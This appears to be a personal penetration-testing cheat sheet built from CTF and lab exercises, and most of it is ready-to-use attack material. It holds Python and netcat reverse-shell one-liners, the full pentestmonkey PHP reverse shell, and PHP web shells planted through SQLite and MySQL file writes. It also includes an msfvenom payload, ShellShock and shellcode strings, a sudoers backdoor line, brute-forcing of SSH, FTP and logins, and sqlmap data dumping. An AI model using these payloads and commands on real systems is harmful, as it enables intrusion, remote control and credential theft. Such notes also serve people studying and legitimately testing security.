# Offensive Bash Scripts
	1. Searching and catting  .bash_history files for any commands
		find -name ".bash_history" -exec cat {} \;
		find /home -name ".bash_history" -exec cat {} \;
		
			> Everything between the -exec and trailing \; is the command to run
			> {} will catch the contents from find command
			
	2. Searching and Catting  .bash_history file contents
		cat $(find /home -name ".bash_history")
		
# ShellShock exploitation with ssh command
	1.  ssh -i noob noob@victim "() { ignored;};/bin/bash -i"
		noob: private key file
		string within "" is the payload
# Shellcode
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Crunch syntax
	crunch 7 7 -t mos%%%% -o pass.txt
	
	min words : 7
	max words : 7
	first 3 characters are supposed to be mos
	remaining 4 are supposed to be digits
	
	  -t: @ will insert lower case characters
              , will insert upper case characters
              % will insert numbers
              ^ will insert symbols

# Hash Cracking 

	1. hash-identifier  
		helps to check the type of hash; MD5, MD2
	2. findmyhash MD5 -h b78aae356709f8c31118ea613980954
	
	3. hashcat -a 0 -m 0 fileContaingHash /usr/share/wordlists/rockyou.txt -o result.txt

		 -m 0; 0 is for md5
		 -a 0; attacks mode is set to 0 which means straight
# Writing a shell on the SQLite query executor

	ATTACH DATABASE '/home/devnull/public_html/img/test.php' as pwn;
        CREATE TABLE pwn.shell (code TEXT); INSERT INTO pwn.shell (code) VALUES ("<pre><?php echo 'Jai baba'; ?></pre>");

# Privilege Escalation (Linux)
	1. uname -a
	2. cat /etc/*release*
	3. cat /etc/lsb-release
	4. http://www.securitysift.com/download/linuxprivchecker.py 
	5. Check for /etc/crontab file and further directories like /etc/cron.daily etc
	6. Checking SUID files available in the system by running
		find / -perm -u=s -type f 2>/dev/null
		find / -perm +4000 2> /dev/null
	7. Entry that should be listed in the sudoers file for a user --> echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Bash shells
	1. /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
	2. sudo -i 
		Lets the user to run the shell as root privs. Also acquires the root user's environment.
	
	
# Bind Shells

# wget

	1. To download all the files from a list of urls, use option -i
	
	wget -i <fileContainingUrls.txt>

# zip password brute-force using fcrackzip
	1. fcrackzip -v -D -u -p ~/tr0ll2/answer2.txt lmao.zip 

# Reverse Shells
	1. Python shell
		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	2. netcat
		nc -lvp 443
		nc -nv <IP Address> 443 -e /bin/sh

# Reverse Shells using metasploit

  	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
     		 
		 append <?php ?> in the shell.php file
		 
# SSH
	1. Bruteforcing password authentication enabled ssh service with hydra
		hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
	2. Bruteforcing password authentication enabled ssh service with medusa
	
		medusa -u jack -P rockyou.txt -h 10.3.3.47 -M ssh -f -e ns -t 5
		
# Basic Authentication Brute

	1. hydra -s 443 -l <username> -P <wordlist> -t 1 -f -vV <ip address> https-get <url directory, i.e. />
	
# SMTP enumeration
	1. smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <ipAddress>
	2. auxiliary/scanner/smtp/smtp_enum
		 
# Sqlmap

	1. python sqlmap -u “https://target.com/index.php?name=abc" --batch
	If there are a lot of parameters within a single page, you could use the batch switch to save yourself some waiting 		time. What batch does is essentially skipping all user inputs and use the default option instead.
	
	2. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5
	One could also increase the risk and level value for sqlmap to test for more payloads.
	
	3. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5 --exclude-sysdbs
	In combination with --exclude-sysdbs only part of the schema containing non-system databases will be retrieved 		and shown.
	
	4. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5 --exclude-sysdbs --no-cast
		--no-cast can also be used to decrease the payloads length
		
	5. sqlmap -r sql.txt --level=5 --risk=3
	
	6. Post form
		sqlmap -u "http://victim:1337/978345210/index.php" --method POST  --data="username=admin&password=password&  submit=+Login+" --level=5 --risk=3 --dbms=MySql --dbs
		
		--dbs = finds the underlying databases
	7. Dumping records from the columns
		sqlmap -u "http://victim:1337/978345210/index.php" --method POST --data="username=abc&password=pass&submit=" --dbms=mysql --level=5 --risk=3 -D <databaseName> -T <tableName> -C <columnName1,columnName2> --dump

# Wordpress Scanning
	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
	2. wpscan --url https://10.0.2.9:12038/blogblog --enumerate ap
	
    		u : enumerate usernames 
    		vp : vulnerable plugins
		p : plugins
		ap : all plugins
		
	3. Bruteforce login credentials on wordpress site
		wpscan --url http://192.168.1.2 --wordlist=/path/to/file.txt --username rama --threads 20
    
# Changing a python urllib2.urlopen method to work with ssl

	1. 
		import ssl 
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE

		urllib2.urlopen(----- , context = ctx)

# After getting access to mysql command line remotely

	1. Creating a file onto the remote server
		mysql> select "baba" into outfile "/var/www/html/somepath/wp-content/uploads/test.txt";
		mysql> select "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/somepath/shell.php"
    
# smb scan
	1. smbclient -L 192.168.1.1
	2. nmblookup -A target
	3. smbclient //MOUNT/share -I target -N
	4. rpcclient -U "" target
	5. enum4linux target
	
# POST form bruteforce using hydra

	1. hydra -vV -L fileList.txt -p randomPassword 192.168.1.3 http-post-form '/admin.php:log=^USER^&pwd=^PASS^&submit=Log+In:F=Invalid username' -o results.txt -t 20
		/admin.php : Location of the post form
		log=^USER^&pwd=^PASS^&submit=Log+In  : POST parameters
		F=Invalid username  : Ignore all the responses when the response text contain this 'Invalid username' string
		 

# Uploading files using curl when PUT enabled

	1. curl --upload-file  <fileNameToUpload> -v --url http://192.168.159.132/test/reverse_shell.php -0 --http1.0
			-0 : http version to be used	
# Nikto commands
	1. nikto -host 10.0.2.12 -port 80 -root /test/
	
# ftp brute
	1. hydra -V -L user.lst -P password.lst ftp://192.168.X.X
	
# Python script for checking for same file in multiple folders
robots.txt file must be created and must contain all the possible folders
****************************************************************************************************************************
#!/usr/bin/python

import httplib
import urllib2
#foreign Ip address
ip = '10.0.2.19'
#File that needs to be checked in all the folders
img_name = 'fileName.jpg'

# read URIs found in robots.txt
f = open('robots.txt','r')
uri_list = f.readlines()
f.close()

uri_to_check = []

print '[*] Start checking ...'
for uri in uri_list:
        conn = httplib.HTTPConnection(ip)
        conn.request('GET', (uri.rstrip('\n')+'/'))
        response = conn.getresponse()

        if response.status != 404:                                                      # filter error code 404 to make the result nice and tidy
                print '[+] ' + uri.rstrip('\n')+'/'
                print '[-] ' + str(response.status)
                uri_to_check.append('http://' + ip + uri.rstrip('\n') + '/' + img_name) # if the response code is not 404 then put in uri_to_check list for further analysis

# save under inspection URIs to file for further analysis
print '[*] Saving result to file: uris_to_check.txt'
f = open('uris_to_check.txt', 'w')
for uri in uri_to_check:
        f.write(uri + '\n')
f.close()

print '[*] Done!'
****************************************************************************************************************************
	
ref: https://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2/

# Custom php shell
	<?php
	// php-reverse-shell - A Reverse Shell implementation in PHP
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
	//
	// This tool may be used for legal purposes only.  Users take full responsibility
	// for any actions performed using this tool.  The author accepts no liability
	// for damage caused by this tool.  If these terms are not acceptable to you, then
	// do not use this tool.
	//
	// In all other respects the GPL version 2 applies:
	//
	// This program is free software; you can redistribute it and/or modify
	// it under the terms of the GNU General Public License version 2 as
	// published by the Free Software Foundation.
	//
	// This program is distributed in the hope that it will be useful,
	// but WITHOUT ANY WARRANTY; without even the implied warranty of
	// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	// GNU General Public License for more details.
	//
	// You should have received a copy of the GNU General Public License along
	// with this program; if not, write to the Free Software Foundation, Inc.,
	// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
	//
	// This tool may be used for legal purposes only.  Users take full responsibility
	// for any actions performed using this tool.  If these terms are not acceptable to
	// you, then do not use this tool.
	//
	// You are encouraged to send comments, improvements or suggestions to
	// me at pentestmonkey@pentestmonkey.net
	//
	// Description
	// -----------
	// This script will make an outbound TCP connection to a hardcoded IP and port.
	// The recipient will be given a shell running as the current user (apache normally).
	//
	// Limitations
	// -----------
	// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
	// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
	// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
	//
	// Usage
	// -----
	// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '127.0.0.1';  // CHANGE THIS
	$port = 1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;

	//
	// Daemonise ourself if possible to avoid zombies later
	//

	// pcntl_fork is hardly ever available, but will allow us to daemonise
	// our php process and avoid zombies.  Worth a try...
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
				}
	
		if ($pid) {
		exit(0);  // Parent exits
			}

		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
			}

		$daemon = 1;
			} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
			}

		// Change to a safe directory
		chdir("/");

		// Remove any umask we inherited
			umask(0);

		//
		// Do the reverse shell...
		//

		// Open reverse connection
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
			printit("$errstr ($errno)");
			exit(1);
			}

		// Spawn shell process
		$descriptorspec = array(
		   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
 		  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
 		  2 => array("pipe", "w")   // stderr is a pipe that the child will write to
			);

			$process = proc_open($shell, $descriptorspec, $pipes);

			if (!is_resource($process)) {
			printit("ERROR: Can't spawn shell");
			exit(1);
			}

			// Set everything to non-blocking
		// Reason: Occsionally reads will block, even though stream_select tells us they won't
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);

		printit("Successfully opened reverse shell to $ip:$port");

		while (1) {
			// Check for end of TCP connection
			if (feof($sock)) {
				printit("ERROR: Shell connection terminated");
				break;
			}

			// Check for end of STDOUT
			if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
			}

			// Wait until a command is end down $sock, or some
			// command output is available on STDOUT or STDERR
			$read_a = array($sock, $pipes[1], $pipes[2]);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

			// If we can read from the TCP socket, send
			// data to process's STDIN
			if (in_array($sock, $read_a)) {
				if ($debug) printit("SOCK READ");
				$input = fread($sock, $chunk_size);
				if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
			}

			// If we can read from the process's STDOUT
			// send data down tcp connection
			if (in_array($pipes[1], $read_a)) {
				if ($debug) printit("STDOUT READ");
				$input = fread($pipes[1], $chunk_size);
				if ($debug) printit("STDOUT: $input");
				fwrite($sock, $input);
			}

			// If we can read from the process's STDERR
			// send data down tcp connection
			if (in_array($pipes[2], $read_a)) {
				if ($debug) printit("STDERR READ");
				$input = fread($pipes[2], $chunk_size);
				if ($debug) printit("STDERR: $input");
				fwrite($sock, $input);
			}
		}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);

	// Like print, but does nothing if we've daemonised ourself
	// (I can't figure out how to redirect STDOUT like a proper daemon)
	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}

	?> 
	
	Another Simple php shell (one liner)
	
	<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

# nmap
	1. nmap -iL list.txt -sn -Pn
	
		-sn : Nmap not to do a port scan after host discovery, and only print out the available hosts that responded 			   to the host discovery probes.
		
	2. nmap -sU -p- -Pn -iL scopeList.txt -oA udpScanOutput
		- scanning all udp ports (-sU, -p-) and taking input from the list. Saving output in all formats using -oA.
		
https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/

# DELETE request using forms 
	1. 	<html>
		<body>
		<form action="https://test.com" method="POST">
		<input type="hidden" name="_method" value="DELETE">
		<input type="submit" value="Submit request" />
		</form>
		</body>
		</html>
https://stackoverflow.com/questions/11833061/is-csrf-possible-with-put-or-delete-methods

# Echo timestamp request

		1. hping3 x.x.x.x --icmp --icmp-ts -V
		 TimeStampRequest (Type 13) and TimeStamp Reply (Type14): Asks the machine for its current time (based on 		   milliseconds from midnight GMT). If it responds... well you know it is alive AND you know roughly where in 		       the world the IP is.
		
https://serverfault.com/questions/818058/get-remote-system-time-from-icmp-timestamp

# SSHscan for enumerating weak ciphers

		1. https://github.com/evict/SSHScan

# Post Exploitation; techniques for becoming root
		1. On linux systems, check "sudo -l" for list of allowed commands for the user.
		2. From within the man page, we can execute random commands by using a '!' symbol.
			!/bin/bash  or  !cat /etc/shadow
			
# Bash command shortcuts for editing files
		1. sort -u fileName.txt > /tmp/newFile.txt   ---> Remove duplicate enteries and create a new file

# Base64 decode bash commandline
		echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
		
# Sniffing http traffic using tcpdump
		1. tcpdump -c 20 -s 0 -i eth1 -A host 192.168.1.1 and tcp port http

:References:

http://sketchymoose.blogspot.in/2012/01/beginning-web-pen-testing-icmp-scans.html
https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
http://xforeveryman.blogspot.in/2012/01/helper-brute-force-https-basic-access.html
http://shell-storm.org/shellcode/
http://gwae.trollab.org/sqlite-injection.html
http://sleeplesscoding.blogspot.in/2011/01/using-tcpdump-to-sniff-http-traffic.html


